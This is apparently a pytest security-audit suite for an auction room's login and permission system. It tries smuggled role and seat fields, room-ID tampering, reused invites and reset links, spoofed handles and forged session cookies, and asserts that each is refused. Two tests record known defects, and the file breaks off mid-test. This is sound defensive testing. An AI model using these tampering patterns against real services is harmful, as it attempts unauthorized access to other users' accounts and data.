"""Independent security audit of the rookie auction room's identity and
authorization layer (docs/auction/ROOKIE_AUCTION_ROOM.md §3, §6, §10, §12).

Every attack goes through the REAL HTTP routes (FastAPI TestClient) against a
temporary store — never production.  Tests that pin a confirmed defect are
``xfail(strict=True)`` with an ``AUDIT DEFECT`` reason: they turn into an
XPASS failure the moment the defect is fixed, so the marker must then be
removed.
"""

from __future__ import annotations

import csv
import io
import json
import logging
import sys
import threading
import time

import pytest
from fastapi.testclient import TestClient

from src.api import draft_optimizer_api, rate_limit
from src.auction import accounts, api, engine, notify, recovery
from src.auction.rules import default_rules
from tests.auction.helpers import make_pool
from tests.auction.test_api_store import (  # noqa: F401 - fixture import
    ORIGIN,
    _cmd,
    _make_room,
    _owner_client,
    _ready_room,
    env,
)

SECRET_MAX = 87  # alice's private maximum — must never reach anyone but seat S2
BOB_MAX = 23
PW = {
    "alice": "alice-secret-pass-1",
    "bob": "bob-secret-pass-22",
    "watcher": "watcher-pass-333",
}
FCM = "https://fcm.googleapis.com/fcm/send/"
KEYS = {"p256dh": "BPk" + "a" * 60, "auth": "authkey1234"}


@pytest.fixture(autouse=True)
def _fresh_login_throttle():
    rate_limit.login_reset_for_tests()
    yield
    rate_limit.login_reset_for_tests()


# ---------------------------------------------------------------------------
# harness
# ---------------------------------------------------------------------------


def _invite(owner, room, seat=None, role="manager", handle=None, ttl=None):
    body: dict = {"role": role}
    if seat:
        body["seat"] = seat
    if handle:
        body["intendedHandle"] = handle
    if ttl is not None:
        body["ttlHours"] = ttl
    r = owner.post(f"/api/auction/rooms/{room}/invites", json=body, headers=ORIGIN)
    assert r.status_code == 200, r.text
    return r.json()["joinPath"].split("token=")[1]


def _claim(app, token, handle, password=None, client=None):
    c = client or TestClient(app)
    r = c.post(
        "/api/auction/invites/claim",
        json={"token": token, "handle": handle, "password": password or PW.get(handle, "p" * 12)},
        headers=ORIGIN,
    )
    return c, r


def _join(app, owner, room, seat, handle, role="manager"):
    token = _invite(owner, room, seat=seat, role=role)
    c, r = _claim(app, token, handle)
    assert r.status_code == 200, r.text
    return c, r.json()["user"]["id"]


def _world(env):  # noqa: F811 - the fixture value, passed through
    """Owner (commissioner, S1), alice (S2), bob (S3), an observer; one open
    lot where alice holds a private maximum of $87 and leads bob."""
    st, app = env
    owner = _owner_client(app)
    room = _ready_room(owner)
    alice, alice_id = _join(app, owner, room, "S2", "alice")
    bob, bob_id = _join(app, owner, room, "S3", "bob")
    obs, obs_id = _join(app, owner, room, None, "watcher", role="observer")
    aid = _cmd(owner, room, {"kind": "nominate", "player": "991"}).json()["auction"]
    r = _cmd(bob, room, {"kind": "bid", "auction": aid, "max": BOB_MAX}, key="bob-bid-00001")
    assert r.status_code == 200 and r.json()["leading"], r.text
    r = _cmd(alice, room, {"kind": "bid", "auction": aid, "max": SECRET_MAX}, key="alice-bid-0001")
    assert r.status_code == 200 and r.json()["leading"], r.text
    return {
        "st": st,
        "app": app,
        "room": room,
        "aid": aid,
        "owner": owner,
        "alice": alice,
        "bob": bob,
        "obs": obs,
        "ids": {"alice": alice_id, "bob": bob_id, "obs": obs_id},
    }


def _paths_with(obj, needle, path=""):
    """Every JSON path whose value equals ``needle`` (bools excluded)."""
    hits = []
    if isinstance(obj, dict):
        for k, v in obj.items():
            hits += _paths_with(v, needle, f"{path}.{k}")
    elif isinstance(obj, list):
        for i, v in enumerate(obj):
            hits += _paths_with(v, needle, f"{path}[{i}]")
    elif isinstance(obj, (int, float)) and not isinstance(obj, bool) and obj == needle:
        hits.append(path)
    elif isinstance(obj, str) and obj.strip() == str(needle):
        hits.append(path)
    return hits


def _keys(obj) -> set:
    out: set = set()
    if isinstance(obj, dict):
        for k, v in obj.items():
            out.add(k)
            out |= _keys(v)
    elif isinstance(obj, list):
        for v in obj:
            out |= _keys(v)
    return out


def _revision(st, room) -> int:
    return st.load(room)[1]


def _read_routes(room, *, commissioner=False):
    routes = [
        f"/api/auction/rooms/{room}/view",
        f"/api/auction/rooms/{room}/view?after=0&wait=0.3",
        f"/api/auction/rooms/{room}/pool",
        f"/api/auction/rooms/{room}/export",
        f"/api/auction/rooms/{room}/advice-context",
        "/api/auction/notify/inbox",
        f"/api/auction/notify/inbox?roomId={room}",
        "/api/auction/notify/state",
        "/api/auction/auth/me",
    ]
    if commissioner:
        routes.append(f"/api/auction/rooms/{room}/preflight")
    return routes


@pytest.fixture()
def fake_roster_context(monkeypatch):
    calls = []

    def fake(contract, league_key, *, owner_id=None, roster_id=None, team_name=None):
        calls.append(owner_id)
        return {"openRosterSpots": 3, "ownerEcho": owner_id, "cutLadder": {"rungs": []}}

    monkeypatch.setattr(draft_optimizer_api, "get_roster_context", fake)
    sys.modules["server"].latest_contract_data["meta"] = {"leagueKey": "dynasty_main"}
    return calls


# ---------------------------------------------------------------------------
# 1. Private maxima never reach anyone but their own seat
# ---------------------------------------------------------------------------


def test_no_route_leaks_a_rivals_private_maximum(env, fake_roster_context):  # noqa: F811
    w = _world(env)
    room = w["room"]
    for who in ("owner", "bob", "obs"):
        c = w[who]
        for url in _read_routes(room, commissioner=(who == "owner")):
            r = c.get(url)
            assert r.status_code == 200, (who, url, r.text)
            body = r.json()
            assert not _paths_with(body, SECRET_MAX), (who, url, _paths_with(body, SECRET_MAX))
            assert _keys(body).isdisjoint({"bids", "hist", "bid_log", "queues"}), (who, url)
    # the commissioner is a bidder too: its private block is its OWN seat only
    ov = w["owner"].get(f"/api/auction/rooms/{room}/view").json()
    assert ov["me"]["private"]["seat"] == "S1"
    assert all(not e["vis"].startswith(("seat:S2", "seat:S3")) for e in ov["events"])
    # bob's own view carries his own max, never alice's
    bv = w["bob"].get(f"/api/auction/rooms/{room}/view").json()
    assert [b["max"] for b in bv["me"]["private"]["my_bids"]] == [BOB_MAX]
    assert all(not e["vis"].startswith("seat:S2") for e in bv["events"])
    # the observer has no private block and sees public events only
    obv = w["obs"].get(f"/api/auction/rooms/{room}/view").json()
    assert obv["me"]["private"] is None and {e["vis"] for e in obv["events"]} <= {"public"}
    # alice does see her own maximum (the sweep is not vacuous)
    av = w["alice"].get(f"/api/auction/rooms/{room}/view").json()
    assert av["me"]["private"]["my_bids"][0]["max"] == SECRET_MAX


def test_closed_lot_exports_never_carry_the_winning_maximum(env):  # noqa: F811
    w = _world(env)
    room = w["room"]
    r = w["owner"].post(
        f"/api/auction/rooms/{room}/clock", json={"advanceSeconds": 3600}, headers=ORIGIN
    )
    assert r.status_code == 200
    state, _, _ = w["st"].load(room)
    assert state["auctions"][w["aid"]]["status"] == "closed"
    assert state["auctions"][w["aid"]]["winner"] == "S2"
    for who in ("owner", "bob", "obs", "alice"):
        js = w[who].get(f"/api/auction/rooms/{room}/export").json()
        assert not _paths_with(js, SECRET_MAX), who
        text = w[who].get(f"/api/auction/rooms/{room}/export?format=csv").text
        cells = [c for row in csv.reader(io.StringIO(text)) for c in row]
        assert str(SECRET_MAX) not in cells, who
        v = w[who].get(f"/api/auction/rooms/{room}/view").json()
        assert not _paths_with(v["public"], SECRET_MAX), who


def test_outbid_notification_text_never_contains_the_rivals_maximum(env):  # noqa: F811
    w = _world(env)
    items = w["bob"].get("/api/auction/notify/inbox").json()["items"]
    assert any(i["type"] == "outbid" for i in items)
    with w["st"].read() as conn:
        rows = conn.execute(
            "SELECT title, body, data_json FROM notif_inbox WHERE user_id != ?",
            (w["ids"]["alice"],),
        ).fetchall()
    for r in rows:
        blob = " ".join([r["title"], r["body"], r["data_json"]])
        assert f"${SECRET_MAX}" not in blob and f'"max": {SECRET_MAX}' not in blob


def test_long_poll_snapshot_is_scoped_to_the_caller(env):  # noqa: F811
    w = _world(env)
    room = w["room"]
    rev = _revision(w["st"], room)
    out = {}

    def poll():
        out["r"] = w["bob"].get(f"/api/auction/rooms/{room}/view?after={rev}&wait=5")

    t = threading.Thread(target=poll)
    t.start()
    time.sleep(0.6)
    # alice raises (a rival's private action) — wakes bob's long-poll
    r = _cmd(w["alice"], room, {"kind": "bid", "auction": w["aid"], "max": SECRET_MAX + 1})
    assert r.status_code == 200
    t.join(10)
    body = out["r"].json()
    assert body["revision"] > rev
    assert not _paths_with(body, SECRET_MAX + 1) and not _paths_with(body, SECRET_MAX)


def test_receipts_are_per_account(env):  # noqa: F811
    w = _world(env)
    room = w["room"]
    # alice's bid receipt contains her own max; nobody else can fetch it by key
    mine = w["alice"].get(f"/api/auction/rooms/{room}/receipts/alice-bid-0001")
    assert mine.status_code == 200
    for who in ("owner", "bob", "obs"):
        r = w[who].get(f"/api/auction/rooms/{room}/receipts/alice-bid-0001")
        assert r.status_code == 404, who
    # and an anonymous client gets nothing at all
    assert (
        TestClient(w["app"]).get(f"/api/auction/rooms/{room}/receipts/alice-bid-0001").status_code
        == 401
    )


def test_same_idempotency_key_from_another_account_never_replays_its_result(env):  # noqa: F811
    w = _world(env)
    room = w["room"]
    # bob reuses alice's key with alice's exact body: he must get HIS OWN
    # outcome (a bid from S3), not a replay of alice's private receipt.
    r = _cmd(w["bob"], room, {"kind": "bid", "auction": w["aid"], "max": 40}, key="alice-bid-0001")
    assert r.status_code == 200 and not r.json()["replayed"]
    assert not _paths_with(r.json(), SECRET_MAX)


# ---------------------------------------------------------------------------
# 2. Clients can never choose their own actor / seat / role / room
# ---------------------------------------------------------------------------


def test_smuggled_actor_seat_and_role_are_ignored(env):  # noqa: F811
    w = _world(env)
    room, aid = w["room"], w["aid"]
    before, _, _ = w["st"].load(room)
    # bob tries to act as S2 / as the commissioner / via extra fields
    r = _cmd(
        w["bob"],
        room,
        {
            "kind": "bid",
            "auction": aid,
            "max": 30,
            "seat": "S2",
            "actor": {"role": "commissioner", "seat": "S2", "user": w["ids"]["alice"]},
            "role": "commissioner",
            "user": w["ids"]["alice"],
        },
    )
    assert r.status_code == 200
    after, _, _ = w["st"].load(room)
    assert after["auctions"][aid]["bids"]["S2"] == before["auctions"][aid]["bids"]["S2"]
    assert after["auctions"][aid]["bids"]["S3"]["max"] == 30
    with w["st"].read() as conn:
        last = conn.execute(
            "SELECT actor_user_id, actor_seat, payload_json FROM commands WHERE room_id=?"
            " ORDER BY revision DESC LIMIT 1",
            (room,),
        ).fetchone()
    assert last["actor_user_id"] == w["ids"]["bob"] and last["actor_seat"] == "S3"
    assert json.loads(last["payload_json"])["actor"]["role"] == "manager"
    # a commissioner-only command with a smuggled commissioner actor is still refused
    r = _cmd(
        w["bob"],
        room,
        {"kind": "pause", "reason": "x", "actor": {"role": "commissioner", "seat": "S1"}},
    )
    assert r.status_code == 403


def test_trade_answers_are_bound_to_the_real_counterparty(env):  # noqa: F811
    w = _world(env)
    room = w["room"]
    r = _cmd(w["alice"], room, {"kind": "offer_trade", "to": "S1", "give_dollars": 1})
    assert r.status_code == 200, r.text
    tid = r.json()["trade"]
    # bob (not the recipient) cannot accept, alice cannot accept her own offer,
    # and bob cannot cancel someone else's offer
    for c, body in (
        (w["bob"], {"kind": "respond_trade", "trade": tid, "version": 1, "accept": True}),
        (w["alice"], {"kind": "respond_trade", "trade": tid, "version": 1, "accept": True}),
        (w["bob"], {"kind": "cancel_trade", "trade": tid}),
    ):
        rr = _cmd(c, room, body)
        assert rr.status_code == 403, rr.text
    # the observer (no seat) cannot even try
    assert (
        _cmd(
            w["obs"], room, {"kind": "respond_trade", "trade": tid, "version": 1, "accept": True}
        ).status_code
        == 403
    )
    state, _, _ = w["st"].load(room)
    assert state["trades"][tid]["status"] == "open"


def test_room_id_tampering_is_refused_everywhere(env):  # noqa: F811
    w = _world(env)
    st, app = env
    owner = w["owner"]
    other = _ready_room(owner)  # alice/bob/observer are NOT members here
    before = _revision(st, other)
    for who in ("alice", "bob", "obs"):
        c = w[who]
        for url in (
            f"/api/auction/rooms/{other}/view",
            f"/api/auction/rooms/{other}/view?after=0&wait=0.2",
            f"/api/auction/rooms/{other}/pool",
            f"/api/auction/rooms/{other}/export",
            f"/api/auction/rooms/{other}/advice-context",
            f"/api/auction/rooms/{other}/receipts/alice-bid-0001",
            f"/api/auction/rooms/{other}/preflight",
            f"/api/auction/notify/inbox?roomId={other}",
        ):
            assert c.get(url).status_code == 403, (who, url)
        assert _cmd(c, other, {"kind": "nominate", "player": "992"}).status_code == 403
        for path, body in (
            ("watch", {"auction": "A1"}),
            ("invites", {"seat": "S4"}),
            ("clock", {"advanceSeconds": 60}),
            ("clone", {}),
        ):
            r = c.post(f"/api/auction/rooms/{other}/{path}", json=body, headers=ORIGIN)
            assert r.status_code == 403, (who, path, r.text)
    # unknown rooms are 404, not a membership oracle for anything else
    assert w["alice"].get("/api/auction/rooms/r_doesnotexist/view").status_code == 404
    assert _revision(st, other) == before


def test_commissioner_member_ids_are_scoped_to_the_room(env):  # noqa: F811
    """Reset/remove take a member id in the PATH; one outside the room is 404."""
    w = _world(env)
    st, app = env
    owner = w["owner"]
    other = _ready_room(owner)
    carol, carol_id = _join(app, owner, other, "S2", "carol")
    # carol is only in `other`; using room `w.room` must not reach her
    for path in ("reset-link", "remove"):
        r = owner.post(
            f"/api/auction/rooms/{w['room']}/members/{carol_id}/{path}",
            json={"reason": "x"},
            headers=ORIGIN,
        )
        assert r.status_code == 404, (path, r.text)
    # a manager cannot use another room's commissioner powers on carol either
    r = w["alice"].post(f"/api/auction/rooms/{other}/members/{carol_id}/reset-link", headers=ORIGIN)
    assert r.status_code == 403
    assert carol.get(f"/api/auction/rooms/{other}/view").status_code == 200


# ---------------------------------------------------------------------------
# 3. Observers and managers attempting commissioner / seat mutations
# ---------------------------------------------------------------------------

_COMMISSIONER_COMMANDS = [
    {"kind": "pause", "reason": "x"},
    {"kind": "resume", "reason": "x"},
    {"kind": "adjust_budget", "seat": "S2", "amount": 50, "reason": "x"},
    {"kind": "set_seat", "seat": "S2", "patch": {"name": "pwned"}, "reason": "x"},
    {"kind": "set_order", "order": ["S2", "S1"], "basis": "x"},
    {"kind": "confirm_rules", "keys": ["tie_rule"]},
    {"kind": "configure", "rules": {"rounds": 1}},
    {"kind": "start"},
    {"kind": "verify_trade", "trade": "T1", "approve": True, "reason": "x"},
]
_SEAT_COMMANDS = [
    {"kind": "nominate", "player": "992"},
    {"kind": "bid", "auction": "A1", "max": 50},
    {"kind": "withdraw", "auction": "A1"},
    {"kind": "pass_nomination"},
    {"kind": "set_queue", "players": ["993"], "auto": True},
    {"kind": "offer_trade", "to": "S2", "give_dollars": 1},
    {"kind": "respond_trade", "trade": "T1", "version": 1, "accept": True},
    {"kind": "cancel_trade", "trade": "T1"},
]


def _commissioner_routes(room, member_id):
    return [
        ("post", f"/api/auction/rooms/{room}/invites", {"seat": "S4"}),
        ("post", f"/api/auction/rooms/{room}/invites", {"role": "observer"}),
        ("post", f"/api/auction/rooms/{room}/clock", {"advanceSeconds": 3600}),
        ("post", f"/api/auction/rooms/{room}/clone", {}),
        ("post", f"/api/auction/rooms/{room}/members/{member_id}/reset-link", {}),
        ("post", f"/api/auction/rooms/{room}/members/{member_id}/remove", {"reason": "x"}),
        ("get", f"/api/auction/rooms/{room}/preflight", None),
        ("get", f"/api/auction/rooms/{room}/points-for-preview", None),
    ]


def test_manager_cannot_perform_any_commissioner_action(env):  # noqa: F811
    w = _world(env)
    st, room = w["st"], w["room"]
    before = st.load(room)
    for body in _COMMISSIONER_COMMANDS:
        r = _cmd(w["alice"], room, body)
        assert r.status_code == 403, (body, r.text)
    for method, url, body in _commissioner_routes(room, w["ids"]["bob"]):
        r = (
            w["alice"].post(url, json=body, headers=ORIGIN)
            if method == "post"
            else w["alice"].get(url)
        )
        assert r.status_code == 403, (url, r.text)
    # a manager cannot create rooms or mint a commissioner invite
    assert w["alice"].post("/api/auction/rooms", json={}, headers=ORIGIN).status_code == 403
    assert st.load(room) == before
    with st.read() as conn:
        n = conn.execute("SELECT COUNT(*) FROM rooms").fetchone()[0]
    assert n == 1


def test_observer_cannot_mutate_anything(env):  # noqa: F811
    w = _world(env)
    st, room = w["st"], w["room"]
    before = st.load(room)
    for body in _COMMISSIONER_COMMANDS + _SEAT_COMMANDS:
        r = _cmd(w["obs"], room, body)
        assert r.status_code == 403, (body, r.text)
    for method, url, body in _commissioner_routes(room, w["ids"]["bob"]):
        r = w["obs"].post(url, json=body, headers=ORIGIN) if method == "post" else w["obs"].get(url)
        assert r.status_code == 403, (url, r.text)
    assert st.load(room) == before
    # The only room-scoped write an observer has is a PERSONAL watch toggle; it
    # does not touch room state or revision.
    r = w["obs"].post(
        f"/api/auction/rooms/{room}/watch", json={"auction": w["aid"]}, headers=ORIGIN
    )
    assert r.status_code == 200 and st.load(room) == before


def test_commissioner_invite_cannot_mint_a_commissioner_or_seated_observer(env):  # noqa: F811
    st, app = env
    owner = _owner_client(app)
    room = _ready_room(owner)
    for body in (
        {"seat": "S2", "role": "commissioner"},
        {"role": "commissioner"},
        {"seat": "S2", "role": "observer"},
        {"role": "manager"},  # a manager invite must name a seat
        {"seat": "S99"},
    ):
        r = owner.post(f"/api/auction/rooms/{room}/invites", json=body, headers=ORIGIN)
        assert r.status_code in (400, 404), (body, r.text)


# ---------------------------------------------------------------------------
# 4. Invites
# ---------------------------------------------------------------------------


def test_expired_invite_is_refused(env, monkeypatch):  # noqa: F811
    st, app = env
    owner = _owner_client(app)
    room = _ready_room(owner)
    token = _invite(owner, room, seat="S2", ttl=1)
    real = time.time()
    monkeypatch.setattr(api, "_now", lambda: real + 3601)
    assert TestClient(app).get(f"/api/auction/invites/peek?token={token}").status_code == 404
    _, r = _claim(app, token, "latecomer")
    assert r.status_code == 404 and r.json()["error"] == "invite_invalid"
    with st.read() as conn:
        assert (
            conn.execute("SELECT COUNT(*) FROM users WHERE handle='latecomer'").fetchone()[0] == 0
        )


def test_invite_is_single_use_and_reissue_revokes_the_old_one(env):  # noqa: F811
    st, app = env
    owner = _owner_client(app)
    room = _ready_room(owner)
    old = _invite(owner, room, seat="S2")
    new = _invite(owner, room, seat="S2")  # one live invite per seat
    _, r = _claim(app, old, "alice")
    assert r.status_code == 404
    alice, r = _claim(app, new, "alice")
    assert r.status_code == 200
    # the same token again — new account and existing account both refused
    _, r = _claim(app, new, "mallory")
    assert r.status_code == 404
    r = alice.post("/api/auction/invites/claim", json={"token": new}, headers=ORIGIN)
    assert r.status_code == 404


def test_a_claimed_seat_cannot_be_claimed_twice(env):  # noqa: F811
    st, app = env
    owner = _owner_client(app)
    room = _ready_room(owner)
    alice, _ = _join(app, owner, room, "S2", "alice")
    # the commissioner (mistake or malice) issues a second invite for S2
    token = _invite(owner, room, seat="S2")
    _, r = _claim(app, token, "mallory")
    assert r.status_code == 409 and r.json()["error"] == "seat_taken"
    with st.read() as conn:
        assert conn.execute("SELECT COUNT(*) FROM users WHERE handle='mallory'").fetchone()[0] == 0
    # alice cannot take a second seat with an invite either
    token = _invite(owner, room, seat="S4")
    r = alice.post("/api/auction/invites/claim", json={"token": token}, headers=ORIGIN)
    assert r.status_code == 409 and r.json()["error"] == "already_member"
    assert alice.get(f"/api/auction/rooms/{room}/view").json()["me"]["seat"] == "S2"


def test_handle_locked_invite_refuses_other_handles_new_or_signed_in(env):  # noqa: F811
    st, app = env
    owner = _owner_client(app)
    room = _ready_room(owner)
    other_room = _ready_room(owner)
    mallory, _ = _join(app, owner, other_room, "S2", "mallory")
    token = _invite(owner, room, seat="S3", handle="alice")
    # a signed-in account with a different handle
    r = mallory.post("/api/auction/invites/claim", json={"token": token}, headers=ORIGIN)
    assert r.status_code == 403 and r.json()["error"] == "invite_mismatch"
    # a brand-new account with a different handle
    _, r = _claim(app, token, "not-alice")
    assert r.status_code == 403
    # the token is still valid for the intended person
    assert TestClient(app).get(f"/api/auction/invites/peek?token={token}").status_code == 200
    _, r = _claim(app, token, "alice")
    assert r.status_code == 200


def test_handle_lock_cannot_be_bypassed_by_case_when_the_owner_already_exists(env):  # noqa: F811
    st, app = env
    owner = _owner_client(app)
    room_a = _ready_room(owner)
    room_b = _ready_room(owner)
    _join(app, owner, room_a, "S2", "alice")  # the real alice already has an account
    token = _invite(owner, room_b, seat="S2", handle="alice")
    for spoof in ("ALICE", "Alice", "alice"):
        _, r = _claim(app, token, spoof, password="attacker-pass-9")
        assert r.status_code == 409 and r.json()["error"] == "handle_taken", spoof


def test_knowing_a_sleeper_username_grants_nothing(env):  # noqa: F811
    st, app = env
    owner = _owner_client(app)
    room = _ready_room(owner)
    state, _, _ = st.load(room)
    sleeper_ids = [s["sleeper_user_id"] for s in state["seats"] if s["sleeper_user_id"]]
    assert sleeper_ids
    attacker = TestClient(app)
    for sid in sleeper_ids[:3]:
        # no invite → no account; no password → no login
        r = attacker.post(
            "/api/auction/invites/claim",
            json={"token": sid, "handle": sid, "password": "p" * 12},
            headers=ORIGIN,
        )
        assert r.status_code == 404
        r = attacker.post(
            "/api/auction/auth/login",
            json={"handle": sid, "password": sid},
            headers=ORIGIN,
        )
        assert r.status_code == 401
    assert attacker.get("/api/auction/auth/me").json()["user"] is None
    assert attacker.get(f"/api/auction/rooms/{room}/view").status_code == 401
    with st.read() as conn:
        assert conn.execute("SELECT COUNT(*) FROM users").fetchone()[0] == 1  # only the owner


# ---------------------------------------------------------------------------
# 5. Password reset, seat replacement, revocation
# ---------------------------------------------------------------------------


def _reset_token(owner, room, uid):
    r = owner.post(f"/api/auction/rooms/{room}/members/{uid}/reset-link", headers=ORIGIN)
    assert r.status_code == 200, r.text
    return r.json()["resetPath"].split("token=")[1]


def test_expired_reset_link_is_refused(env, monkeypatch):  # noqa: F811
    w = _world(env)
    token = _reset_token(w["owner"], w["room"], w["ids"]["alice"])
    real = time.time()
    monkeypatch.setattr(api, "_now", lambda: real + recovery.RESET_TTL_SECONDS + 5)
    r = TestClient(w["app"]).post(
        "/api/auction/auth/reset",
        json={"token": token, "password": "new-pass-12345"},
        headers=ORIGIN,
    )
    assert r.status_code == 404
    monkeypatch.setattr(api, "_now", lambda: real + 5)
    assert w["alice"].get(f"/api/auction/rooms/{w['room']}/view").status_code == 200


def test_reissued_reset_link_voids_the_previous_one(env, monkeypatch):  # noqa: F811
    w = _world(env)
    first = _reset_token(w["owner"], w["room"], w["ids"]["alice"])
    real = time.time()
    monkeypatch.setattr(api, "_now", lambda: real + 5)  # see the same-second defect below
    second = _reset_token(w["owner"], w["room"], w["ids"]["alice"])
    c = TestClient(w["app"])
    body = {"token": first, "password": "new-pass-12345"}
    assert c.post("/api/auction/auth/reset", json=body, headers=ORIGIN).status_code == 404
    body = {"token": second, "password": "new-pass-12345"}
    assert c.post("/api/auction/auth/reset", json=body, headers=ORIGIN).status_code == 200


@pytest.mark.xfail(
    strict=True,
    reason=(
        "AUDIT DEFECT (LOW): recovery.issue_reset keys the member's inbox record as "
        "f'reset:{int(now)}' under UNIQUE(room_id, user_id, logical_key), so a second reset link "
        "for the same member within the same second (double-click, retry - the route has no "
        "Idempotency-Key) raises sqlite3.IntegrityError -> unhandled HTTP 500. Fix: use a "
        "unique key (e.g. a token-hash prefix) or INSERT OR IGNORE."
    ),
)
def test_reset_link_can_be_reissued_within_the_same_second(env, monkeypatch):  # noqa: F811
    w = _world(env)
    fixed = time.time()
    monkeypatch.setattr(api, "_now", lambda: fixed)
    owner = TestClient(w["app"], raise_server_exceptions=False)
    owner.cookies.set(api.COOKIE_NAME, w["owner"].cookies.get(api.COOKIE_NAME))
    url = f"/api/auction/rooms/{w['room']}/members/{w['ids']['alice']}/reset-link"
    assert owner.post(url, headers=ORIGIN).status_code == 200
    assert owner.post(url, headers=ORIGIN).status_code == 200


def test_reset_revokes_every_session_and_binds_only_its_own_account(env):  # noqa: F811
    w = _world(env)
    app, room = w["app"], w["room"]
    # alice has a second device signed in
    alice2 = TestClient(app)
    r = alice2.post(
        "/api/auction/auth/login",
        json={"handle": "alice", "password": PW["alice"]},
        headers=ORIGIN,
    )
    assert r.status_code == 200
    token = _reset_token(w["owner"], room, w["ids"]["alice"])
    # bob (signed in) uses alice's link: it can only ever act on ALICE's account
    r = w["bob"].post(
        "/api/auction/auth/reset",
        json={"token": token, "password": "bob-took-over-1"},
        headers=ORIGIN,
    )
    assert r.status_code == 200 and r.json()["user"]["handle"] == "alice"
    # both of alice's old sessions are dead, on every route
    for c in (w["alice"], alice2):
        assert c.get(f"/api/auction/rooms/{room}/view").status_code == 401
        assert _cmd(c, room, {"kind": "withdraw", "auction": w["aid"]}).status_code == 401
        assert c.get("/api/auction/notify/inbox").status_code == 401
        assert c.get(f"/api/auction/rooms/{room}/advice-context").status_code == 401
    # bob's own account is untouched: old password still works, new one does not
    for pw, code in ((PW["bob"], 200), ("bob-took-over-1", 401)):
        r = TestClient(app).post(
            "/api/auction/auth/login", json={"handle": "bob", "password": pw}, headers=ORIGIN
        )
        assert r.status_code == code
    # the use is audited against alice's account, and alice's inbox recorded the issue
    with w["st"].read() as conn:
        rows = conn.execute(
            "SELECT action, user_id FROM audit WHERE action LIKE 'password_reset%'"
        ).fetchall()
    assert {(r["action"], r["user_id"]) for r in rows} >= {
        ("password_reset_used", w["ids"]["alice"])
    }


def test_reset_is_refused_for_non_members_and_removed_members(env):  # noqa: F811
    w = _world(env)
    owner, room = w["owner"], w["room"]
    r = owner.post(
        f"/api/auction/rooms/{room}/members/{w['ids']['alice']}/remove",
        json={"reason": "wrong person"},
        headers=ORIGIN,
    )
    assert r.status_code == 200
    r = owner.post(
        f"/api/auction/rooms/{room}/members/{w['ids']['alice']}/reset-link", headers=ORIGIN
    )
    assert r.status_code == 404
    r = owner.post(f"/api/auction/rooms/{room}/members/999999/reset-link", headers=ORIGIN)
    assert r.status_code == 404


def test_replacement_keeps_the_seat_and_cuts_the_old_person_off_everywhere(env):  # noqa: F811
    w = _world(env)
    st, app, room, owner = w["st"], w["app"], w["room"], w["owner"]
    before, _, _ = st.load(room)
    r = owner.post(
        f"/api/auction/rooms/{room}/members/{w['ids']['alice']}/remove",
        json={"reason": "lost account"},
        headers=ORIGIN,
    )
    assert r.status_code == 200 and r.json()["seat"] == "S2"
    after, _, _ = st.load(room)
    assert after == before  # money, bids, lead belong to the SEAT
    alice = w["alice"]
    assert alice.get(f"/api/auction/rooms/{room}/view").status_code == 403
    assert alice.get(f"/api/auction/rooms/{room}/view?after=0&wait=0.3").status_code == 403
    assert alice.get(f"/api/auction/rooms/{room}/advice-context").status_code == 403
    assert alice.get(f"/api/auction/rooms/{room}/receipts/alice-bid-0001").status_code == 403
    assert alice.get(f"/api/auction/notify/inbox?roomId={room}").status_code == 403
    r = _cmd(alice, room, {"kind": "bid", "auction": w["aid"], "max": 99})
    assert r.status_code == 403
    # an idempotent RETRY of her earlier bid is also refused (no stale replay)
    r = _cmd(
        alice, room, {"kind": "bid", "auction": w["aid"], "max": SECRET_MAX}, key="alice-bid-0001"
    )
    assert r.status_code == 403
    # the new person inherits the seat, its maximum and its money
    dave, _ = _join(app, owner, room, "S2", "dave")
    v = dave.get(f"/api/auction/rooms/{room}/view").json()
    assert v["me"]["seat"] == "S2" and v["me"]["private"]["my_bids"][0]["max"] == SECRET_MAX
    with st.read() as conn:
        acts = [
            r["action"] for r in conn.execute("SELECT action FROM audit WHERE room_id=?", (room,))
        ]
    assert "member_removed" in acts and acts.count("member_added") >= 5


@pytest.mark.xfail(
    strict=True,
    reason=(
        "AUDIT DEFECT (LOW): recovery.remove_member records only an audit row. The removed "
        "person gets no inbox record (unlike issue_reset) and the room gets no public event, "
        "so neither the old participant nor the other managers are told the seat changed hands."
    ),
)
def test_replacement_notifies_the_removed_person_and_the_room(env):  # noqa: F811
    w = _world(env)
    st, room = w["st"], w["room"]
    rev = _revision(st, room)
    w["owner"].post(
        f"/api/auction/rooms/{room}/members/{w['ids']['alice']}/remove",
        json={"reason": "lost account"},
        headers=ORIGIN,
    )
    with st.read() as conn:
        told = conn.execute(
            "SELECT COUNT(*) FROM notif_inbox WHERE user_id=? AND room_id=? AND type='account'",
            (w["ids"]["alice"], room),
        ).fetchone()[0]
    public = w["bob"].get(f"/api/auction/rooms/{room}/view").json()
    announced = any(e["revision"] > rev for e in public["events"])
    assert told >= 1 and announced


def _longpoll(client, room, after, wait, out):
    out["r"] = client.get(f"/api/auction/rooms/{room}/view?after={after}&wait={wait}")


def test_removal_during_an_in_flight_long_poll_leaks_nothing(env):  # noqa: F811
    w = _world(env)
    st, room = w["st"], w["room"]
    rev = _revision(st, room)
    out: dict = {}
    t = threading.Thread(target=_longpoll, args=(w["alice"], room, rev, 5, out))
    t.start()
    time.sleep(0.6)
    recovery.remove_member(
        st,
        room_id=room,
        member_user_id=w["ids"]["alice"],
        commissioner_id=1,
        reason="lost account",
        now=time.time(),
    )
    # a revision bump wakes the poll immediately (the re-check must still run)
    assert _cmd(w["bob"], room, {"kind": "bid", "auction": w["aid"], "max": 30}).status_code == 200
    t.join(10)
    r = out["r"]
    assert r.status_code == 403
    assert "public" not in r.json() and not _paths_with(r.json(), SECRET_MAX)


def test_session_revoked_while_long_poll_waits_gets_nothing(env):  # noqa: F811
    w = _world(env)
    st, room = w["st"], w["room"]
    rev = _revision(st, room)
    out: dict = {}
    t = threading.Thread(target=_longpoll, args=(w["alice"], room, rev, 1.5, out))
    t.start()
    time.sleep(0.4)
    accounts.revoke_all_sessions(st, w["ids"]["alice"], time.time())  # e.g. a reset elsewhere
    t.join(10)  # times out WITHOUT a new revision — the re-check must still run
    r = out["r"]
    assert r.status_code == 401
    assert set(r.json()) == {"error", "message"}


def test_expired_and_forged_sessions_are_refused(env, monkeypatch):  # noqa: F811
    w = _world(env)
    room = w["room"]
    forged = TestClient(w["app"])
    for tok in ("x" * 43, "", "a" * 5000):
        forged.cookies.set(api.COOKIE_NAME, tok)
        assert forged.get(f"/api/auction/rooms/{room}/view").status_code == 401
    real = time.time()
